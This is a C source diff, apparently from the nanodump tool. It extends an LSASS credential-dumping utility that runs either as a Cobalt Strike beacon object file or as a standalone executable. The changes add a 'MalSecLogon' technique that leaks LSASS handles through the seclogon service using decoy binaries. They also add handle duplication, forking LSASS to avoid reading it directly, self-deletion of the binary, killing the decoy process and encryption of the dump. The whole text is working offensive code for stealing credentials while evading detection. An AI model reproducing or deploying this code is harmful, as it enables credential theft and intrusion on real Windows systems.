@@ -63,17 +63,7 @@ BOOL write_file(
     PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
     if (!pUnicodeFilePath)
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-            (ULONG32)sizeof(UNICODE_STRING),
-            GetLastError()
-        );
-#endif
+        malloc_failed();
         return FALSE;
     }
 
@@ -123,16 +113,7 @@ BOOL write_file(
     }
     if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtCreateFile, status: 0x%lx\n",
-            status
-        );
-#endif
+        syscall_failed("NtCreateFile", status);
         return FALSE;
     }
     // write the dump
@@ -150,16 +131,7 @@ BOOL write_file(
     NtClose(hFile); hFile = NULL;
     if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtWriteFile, status: 0x%lx\n",
-            status
-        );
-#endif
+        syscall_failed("NtWriteFile", status);
         return FALSE;
     }
 
@@ -190,13 +162,7 @@ BOOL download_file(
     char* packedData = intAlloc(messageLength);
     if (!packedData)
     {
-#ifdef DEBUG
-        BeaconPrintf(CALLBACK_ERROR,
-            "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
-            messageLength,
-            GetLastError()
-        );
-#endif
+        malloc_failed();
         return FALSE;
     }
 
@@ -231,13 +197,7 @@ BOOL download_file(
     char* packedChunk = intAlloc(chunkLength);
     if (!packedChunk)
     {
-#ifdef DEBUG
-        BeaconPrintf(CALLBACK_ERROR,
-            "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
-            chunkLength,
-            GetLastError()
-        );
-#endif
+        malloc_failed();
         return FALSE;
     }
     // the fileId is the same for all chunks
@@ -653,17 +613,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
         new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
         if(!new_range)
         {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-                (ULONG32)sizeof(MiniDumpMemoryDescriptor64),
-                GetLastError()
-            );
-#endif
+            malloc_failed();
             return NULL;
         }
         new_range->next = NULL;
@@ -757,17 +707,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         PBYTE buffer = intAlloc(curr_range->DataSize);
         if (!buffer)
         {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
-                curr_range->DataSize,
-                GetLastError()
-            );
-#endif
+            malloc_failed();
             return NULL;
         }
         NTSTATUS status = NtReadVirtualMemory(
@@ -861,7 +801,7 @@ void go(char* args, int length)
     SHORT   ImplementationVersion;
     BOOL    get_pid_and_leave;
     BOOL    use_seclogon;
-    LPCSTR  nanodump_binary;
+    LPCSTR  binary_path = NULL;
 
     BeaconDataParse(&parser, args, length);
     pid = BeaconDataInt(&parser);
@@ -872,7 +812,7 @@ void go(char* args, int length)
     dup = (BOOL)BeaconDataInt(&parser);
     get_pid_and_leave = (BOOL)BeaconDataInt(&parser);
     use_seclogon = (BOOL)BeaconDataInt(&parser);
-    nanodump_binary = BeaconDataExtract(&parser, NULL);
+    binary_path = BeaconDataExtract(&parser, NULL);
 
     // if not provided, get the PID of LSASS
     if (!pid)
@@ -924,49 +864,86 @@ void go(char* args, int length)
         return;
     }
 
+    /*
+     * MalSecLogon can be used agains nanodump itself (writing it to disk)
+     * or use a another binary (like notepad.exe) and duplicate
+     * the leaked handle in order to remain fileless
+     */
+    BOOL use_seclogon_remotely = use_seclogon && dup;
+    BOOL use_seclogon_locally = use_seclogon && !dup;
     if (use_seclogon)
     {
+        // leak an LSASS handle using MalSecLogon
         success = seclogon_stage_1(
-            nanodump_binary,
+            binary_path,
             dump_name,
             fork,
             use_valid_sig,
+            dup,
             pid
         );
-        if (success)
+        if (use_seclogon_locally)
         {
-            print_success(
-                dump_name,
-                use_valid_sig,
-                TRUE,
-                FALSE
-            );
+            // delete the nanodump binary
+            delete_file(binary_path);
         }
-        else
+        if (!success)
         {
             BeaconPrintf(
                 CALLBACK_ERROR,
-                "SecLogon technique failed!\n"
+                "MalSecLogon technique failed!\n"
             );
+            return;
         }
-        return;
+        if (use_seclogon_locally)
+        {
+            // MalSecLogon created a new nanodump process which created the dump
+            print_success(
+                dump_name,
+                use_valid_sig,
+                TRUE
+            );
+            return;
+        }
     }
 
     // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
     DWORD permissions = LSASS_PERMISSIONS;
-    if (fork)
+    // if we used MalSecLogon remotely, the handle won't have PROCESS_CREATE_PROCESS;
+    if (fork && !use_seclogon_remotely)
     {
         permissions = PROCESS_QUERY_INFORMATION|PROCESS_CREATE_PROCESS;
     }
 
+    DWORD duplicated_pid = 0;
     HANDLE hProcess = obtain_lsass_handle(
         pid,
         permissions,
         dup,
         fork,
+        use_seclogon,
         FALSE,
-        dump_name
+        dump_name,
+        &duplicated_pid
     );
+
+    // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
+    if (fork && use_seclogon)
+    {
+        hProcess = make_handle_full_access(
+            hProcess
+        );
+    }
+
+    // avoid reading LSASS directly by making a fork
+    if (fork)
+    {
+        hProcess = fork_lsass_process(
+            0,
+            hProcess
+        );
+    }
+
     if (!hProcess)
         return;
 
@@ -992,6 +969,13 @@ void go(char* args, int length)
 
     // close the handle
     NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
+
+    // if we used MalSecLogon with a decoy binary, kill the process
+    // you might want to change this...
+    if (use_seclogon_remotely)
+    {
+        kill_process(duplicated_pid);
+    }
 
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(&dc);
@@ -1023,8 +1007,7 @@ void go(char* args, int length)
         print_success(
             dump_name,
             use_valid_sig,
-            do_write,
-            TRUE
+            do_write
         );
     }
 }
@@ -1037,17 +1020,19 @@ void usage(char* procname)
     printf("    --write PATH, -w PATH\n");
     printf("            full path to the dumpfile\n");
     printf("    --valid, -v\n");
-    printf("            create a dump with a valid signature (optional)\n");
+    printf("            create a dump with a valid signature\n");
     printf("    --pid PID, -p PID\n");
-    printf("            the PID of LSASS (optional)\n");
+    printf("            the PID of LSASS\n");
     printf("    --getpid\n");
-    printf("            print the PID of LSASS and leave (optional)\n");
+    printf("            print the PID of LSASS and leave\n");
     printf("    --fork, -f\n");
-    printf("            fork target process before dumping (optional)\n");
+    printf("            fork target process before dumping\n");
     printf("    --dup, -d\n");
-    printf("            duplicate an existing LSASS handle (optional)\n");
+    printf("            duplicate an existing LSASS handle\n");
     printf("    --seclogon, -sl\n");
-    printf("            obtain a handle to LSASS by (ab)using seclogon (optional)\n");
+    printf("            obtain a handle to LSASS by (ab)using seclogon\n");
+    printf("    --binary PATH, -b PATH\n");
+    printf("            full path to the decoy binary used with --dup and --seclogon\n");
     printf("    --help, -h\n");
     printf("            print this help message and leave");
 }
@@ -1066,6 +1051,7 @@ int main(int argc, char* argv[])
     BOOL    get_pid_and_leave = FALSE;
     BOOL    use_seclogon = FALSE;
     BOOL    is_seclogon_stage_2 = FALSE;
+    LPCSTR  binary_path = NULL;
 
 #ifndef _WIN64
     if(IsWoW64())
@@ -1091,6 +1077,11 @@ int main(int argc, char* argv[])
         else if (!strncmp(argv[i], "-w", 3) ||
                  !strncmp(argv[i], "--write", 8))
         {
+            if (i + 1 >= argc)
+            {
+                printf("missing --write value\n");
+                return -1;
+            }
             dump_name = argv[++i];
             if (!strrchr(dump_name, '\\'))
             {
@@ -1101,6 +1092,11 @@ int main(int argc, char* argv[])
         else if (!strncmp(argv[i], "-p", 3) ||
                  !strncmp(argv[i], "--pid", 6))
         {
+            if (i + 1 >= argc)
+            {
+                printf("missing --pid value\n");
+                return -1;
+            }
             i++;
             pid = atoi(argv[i]);
             if (!pid ||
@@ -1129,6 +1125,26 @@ int main(int argc, char* argv[])
                  !strncmp(argv[i], "--stage2", 9))
         {
             is_seclogon_stage_2 = TRUE;
+        }
+        else if (!strncmp(argv[i], "-b", 3) ||
+                 !strncmp(argv[i], "--binary", 8))
+        {
+            if (i + 1 >= argc)
+            {
+                printf("missing --binary value\n");
+                return -1;
+            }
+            binary_path = argv[++i];
+            if (!strrchr(binary_path, '\\'))
+            {
+                printf("You must provide a full path: %s\n", binary_path);
+                return -1;
+            }
+            if (!file_exists(binary_path))
+            {
+                printf("The binary \"%s\" does not exists.\n", binary_path);
+                return -1;
+            }
         }
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
@@ -1172,11 +1188,20 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    if (dup && use_seclogon)
+    if (dup && use_seclogon && !binary_path)
     {
-        printf("Can't set both --dup and --seclogon\n");
+        printf("If --dup and --seclogon are used, you need to provide a binary with --binary\n");
         return -1;
     }
+
+    if ((!dup || !use_seclogon) && binary_path)
+    {
+        printf("The option --binary can only be used with --seclogon and --dup\n");
+        return -1;
+    }
+
+    if (!binary_path)
+        binary_path = argv[0];
 
     // set the signature
     if (use_valid_sig)
@@ -1203,50 +1228,75 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    if (use_seclogon && !is_seclogon_stage_2)
+    /*
+     * MalSecLogon can be used agains nanodump itself (writing it to disk)
+     * or use a another binary (like notepad.exe) and duplicate
+     * the leaked handle in order to remain fileless
+     */
+    BOOL use_seclogon_remotely = use_seclogon && dup;
+    BOOL use_seclogon_locally = use_seclogon && !dup;
+    BOOL is_seclogon_stage_1 = use_seclogon && !is_seclogon_stage_2;
+    if (is_seclogon_stage_1)
     {
+        printf(
+            "[!] MalLogonSec implementation is unstable, errors are to be expected\n"
+        );
+        // leak an LSASS handle using MalSecLogon
         success = seclogon_stage_1(
-            argv[0],
+            binary_path,
             dump_name,
             fork,
             use_valid_sig,
+            dup,
             pid
         );
-        if (success)
+        if (!success)
         {
+            printf(
+                "MalSecLogon technique failed!\n"
+            );
+            return -1;
+        }
+        if (use_seclogon_locally)
+        {
+            // MalSecLogon created a new nanodump process which created the dump
             print_success(
                 dump_name,
                 use_valid_sig,
-                TRUE,
-                FALSE
+                TRUE
             );
             return 0;
-        }
-        else
-        {
-            printf(
-                "SecLogon technique failed!\n"
-            );
-            return -1;
         }
     }
 
     // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
     DWORD permissions = LSASS_PERMISSIONS;
-    if (fork)
+    if (fork && !use_seclogon_remotely)
     {
         permissions = PROCESS_QUERY_INFORMATION|PROCESS_CREATE_PROCESS;
     }
 
+    DWORD duplicated_pid = 0;
     HANDLE hProcess = obtain_lsass_handle(
         pid,
         permissions,
         dup,
         fork,
+        use_seclogon,
         is_seclogon_stage_2,
-        dump_name
+        dump_name,
+        &duplicated_pid
     );
 
+    // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
+    if (fork && use_seclogon)
+    {
+        hProcess = make_handle_full_access(
+            hProcess
+        );
+    }
+
+    // avoid reading LSASS directly by making a fork
     if (fork)
     {
         hProcess = fork_lsass_process(
@@ -1256,7 +1306,7 @@ int main(int argc, char* argv[])
     }
 
     if (!hProcess)
-        return FALSE;
+        return -1;
 
     // allocate a chuck of memory to write the dump
     SIZE_T RegionSize = DUMP_MAX_SIZE;
@@ -1281,6 +1331,13 @@ int main(int argc, char* argv[])
     // close the handle
     NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
 
+    // if we used MalSecLogon with a decoy binary, kill the process
+    // you might want to change this...
+    if (use_seclogon_remotely)
+    {
+        kill_process(duplicated_pid);
+    }
+
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(&dc);
 
@@ -1302,8 +1359,7 @@ int main(int argc, char* argv[])
             print_success(
                 dump_name,
                 use_valid_sig,
-                TRUE,
-                FALSE
+                TRUE
             );
         }
         return 0;
